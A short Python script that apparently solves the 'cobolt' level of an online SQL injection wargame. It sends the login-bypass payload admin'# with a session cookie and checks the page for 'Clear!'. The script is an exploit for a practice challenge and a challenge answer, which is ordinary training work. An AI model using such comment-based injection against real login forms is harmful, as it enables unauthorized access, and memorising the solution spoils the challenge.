from requests import get

url ="https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php/?id=admin%27%23"
cookie = {"PHPSESSID":"c0bed5cfkoofgp0l3nfhdr2c89"}
params = {
    "id":"admin'#"
}

if get(url,params=params,cookies=cookie).text.find("Clear!") > 0:
    print("[*] Success")
